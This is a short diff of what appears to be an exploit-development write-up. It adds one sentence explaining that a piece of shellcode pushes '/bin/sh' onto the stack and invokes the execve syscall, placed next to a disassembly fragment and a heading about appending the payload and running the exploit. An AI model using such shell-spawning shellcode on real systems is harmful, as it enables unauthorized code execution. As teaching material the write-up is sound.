@@ -112,6 +112,7 @@ Its asm code is:
   14:   0f 05                   syscall 
   16:   0a                      .byte 0x
 ```
+What this does is prepare the stack with the parameters: **$0x68732f2f6e69622f** = _"/bin/sh"_ and fire an os _syscall_ _(execve)_.
 
 #### Appending it and executing our exploit again: ####
 ```
